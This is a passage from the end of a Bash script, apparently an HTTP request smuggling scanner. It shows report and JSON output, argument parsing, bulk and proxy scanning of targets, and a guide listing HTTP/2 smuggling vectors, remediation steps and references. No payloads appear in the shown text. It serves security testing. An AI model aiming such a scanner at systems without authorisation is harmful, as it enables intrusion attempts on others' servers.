        echo "| h2cSmuggler (Python) | HTTP/2 → HTTP/1.1 downgrade smuggling           |"
        echo "| smuggler.py          | Albinowax's original timing-based Python tool   |"
        echo ""
        echo "## HTTP/2 Smuggling Note"
        echo ""
        echo "This tool only tests HTTP/1.1 vectors. If the target uses HTTP/2 at the"
        echo "edge (CDN/load balancer), also test:"
        echo "  - H2.CL: HTTP/2 request with Content-Length that conflicts with body"
        echo "  - H2.TE: Injecting Transfer-Encoding header in HTTP/2 (header injection)"
        echo "  - Use: github.com/neex/h2csmuggler or Burp's HTTP Request Smuggler"
        echo ""
        echo "## Remediation"
        echo ""
        echo "  1. Ensure frontend and backend agree on a single protocol (HTTP/1.1 or 2)"
        echo "  2. Configure servers to reject ambiguous requests (both CL and TE present)"
        echo "  3. Normalize requests at the proxy before forwarding"
        echo "  4. Prefer HTTP/2 end-to-end where possible"
        echo "  5. Apply WAF rules to reject requests with conflicting headers"
        echo ""
        echo "## References"
        echo "  - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"
        echo "  - https://portswigger.net/web-security/request-smuggling"
        echo "  - https://portswigger.net/research/browser-powered-desync-attacks"
        echo "  - https://github.com/defparam/smuggler"
        echo "  - https://github.com/neex/h2csmuggler"
    } > "$GUIDE_FILE"

    success "Manual guide written → ${GUIDE_FILE}"
}

# ─── JSON Output ──────────────────────────────────────────────────────────────
write_json() {
    local end_time
    end_time=$(date +%s)
    local elapsed=$((end_time - START_TIME))

    {
        echo "{"
        echo "  \"tool\": \"HTTPSmuggler Ultimate v${VERSION}\","
        echo "  \"github\": \"https://github.com/${GITHUB_REPO}\","
        echo "  \"scan_date\": \"$(date -u +%FT%TZ)\","
        echo "  \"elapsed_seconds\": ${elapsed},"
        echo "  \"total_targets_scanned\": ${SCAN_COUNT},"
        echo "  \"total_vulnerabilities\": ${VULN_COUNT},"
        echo "  \"path_tested\": \"${CUSTOM_PATH}\","
        echo "  \"results\": ["
        local first=true
        for entry in "${VULN_LIST[@]}"; do
            local tgt="${entry%%|*}"
            local rest="${entry#*|}"
            local vname="${rest%%|*}"
            local rest2="${rest#*|}"
            local cat="${rest2%%|*}"
            local strat="${rest2##*|}"
            local desc="${PAYLOADS[${vname}|desc]:-}"
            [[ "$first" == true ]] || echo ","
            first=false
            echo -n "    {"
            echo -n "\"target\":\"${tgt}\","
            echo -n "\"payload_name\":\"${vname}\","
            echo -n "\"category\":\"${cat}\","
            echo -n "\"strategy\":\"${strat}\","
            echo -n "\"description\":\"${desc}\""
            echo -n "}"
        done
        echo ""
        echo "  ]"
        echo "}"
    } > "$JSON_FILE"

    success "JSON results → ${JSON_FILE}"
}

# ─── Argument Parsing ─────────────────────────────────────────────────────────
parse_args() {
    [[ $# -eq 0 ]] && { banner; usage; exit 1; }

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)    banner; usage; exit 0 ;;
            --payloads)   LIST_PAYLOADS=true ;;
            -v)           VERBOSE=true ;;
            -j)           JSON_OUT=true ;;
            -g)           SHOW_GUIDE=true ;;
            -u)           SKIP_UPDATE=true ;;
            --quick)      QUICK_MODE=true ;;
            -f)           TARGET_FILE="$2"; shift ;;
            -p)           CUSTOM_PATH="$2"; shift ;;
            -t)           TIMEOUT_TIMING="$2"; shift ;;
            -T)           THREADS="$2"; shift ;;
            --proxy)
                PROXY_HOST="${2%%:*}"
                PROXY_PORT="${2##*:}"
                shift ;;
            -*)
                error "Unknown option: $1"
                usage
                exit 1 ;;
            *)
                SINGLE_TARGET="$1" ;;
        esac
        shift
    done
}

# ─── Main ─────────────────────────────────────────────────────────────────────
main() {
    parse_args "$@"
    banner
    init_temp
    init_payloads

    if [[ "$LIST_PAYLOADS" == true ]]; then
        list_payloads
        exit 0
    fi

    check_update

    # Validate dependencies
    if ! command -v openssl >/dev/null 2>&1; then
        error "openssl not found. Install it: sudo apt install openssl"
        exit 1
    fi

    # Initialize result files
    {
        echo "# HTTPSmuggler Ultimate v${VERSION} Results"
        echo "# Scan started: $(date -u +%FT%TZ)"
        echo "# Path tested: ${CUSTOM_PATH}"
        echo "# Format: target | payload | category | strategy | timestamp"
        echo "# ──────────────────────────────────────────────────────────"
    } > "$RESULTS_FILE"

    echo -e "  ${DIM}Payloads loaded: ${#PAYLOAD_NAMES[@]}${NC}"
    echo -e "  ${DIM}Verification rounds: ${VERIFY_ROUNDS} (threshold: ${VERIFY_THRESHOLD}/${VERIFY_ROUNDS})${NC}"
    [[ "$QUICK_MODE" == true ]] && echo -e "  ${Y}Quick mode: ON (verification reduced)${NC}"
    [[ -n "$PROXY_HOST" ]] && echo -e "  ${DIM}Proxy: ${PROXY_HOST}:${PROXY_PORT}${NC}"

    # Bulk mode
    if [[ -n "$TARGET_FILE" ]]; then
        [[ ! -f "$TARGET_FILE" ]] && { error "File not found: $TARGET_FILE"; exit 1; }
        echo ""
        info "Bulk mode — reading: ${TARGET_FILE}"
        local total
        total=$(grep -cve '^\s*#' "$TARGET_FILE" 2>/dev/null || echo 0)
        local idx=0
        while IFS= read -r line || [[ -n "$line" ]]; do
            line="${line%%#*}"  # strip inline comments
            line="${line// /}"  # trim spaces
            [[ -z "$line" ]] && continue
            ((idx++))
            echo ""
            echo -e "  ${B}[${idx}/${total}]${NC}"
            scan_target "$line"
        done < "$TARGET_FILE"

    elif [[ -n "${SINGLE_TARGET:-}" ]]; then
        scan_target "$SINGLE_TARGET"
    else
        error "No target specified. Use -h for help."
        exit 1
    fi

    # Final summary
    local end_time
    end_time=$(date +%s)
    local elapsed=$((end_time - START_TIME))

    echo ""
    echo -e "  ${DIM}${BOLD}━━━━━━━━━━━━ SCAN COMPLETE ━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${W}Targets scanned : ${NC}${SCAN_COUNT}"
    echo -e "  ${R}Vulnerabilities : ${NC}${VULN_COUNT}"
    echo -e "  ${W}Elapsed         : ${NC}${elapsed}s"
    echo -e "  ${G}Results file    : ${NC}${RESULTS_FILE}"

    if [[ "$JSON_OUT" == true ]]; then
        write_json
    fi

    if [[ $VULN_COUNT -gt 0 ]]; then
        echo ""
        echo -e "  ${R}${BOLD}━━━ VULNERABLE TARGETS ━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        for entry in "${VULN_LIST[@]}"; do
            local tgt="${entry%%|*}"
            local rest="${entry#*|}"
            local vname="${rest%%|*}"
            local rest2="${rest#*|}"
            local cat="${rest2%%|*}"
            echo -e "  ${R}•${NC} ${W}${tgt}${NC}  ${M}${vname}${NC}  ${DIM}[${cat}]${NC}"
        done
        echo ""
        [[ "$SHOW_GUIDE" == false ]] && \
            echo -e "  ${C}Tip: Run with -g to generate a manual verification guide.${NC}"
    fi

    echo -e "  ${DIM}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    [[ $VULN_COUNT -gt 0 ]] && exit 2 || exit 0
}

main "$@"
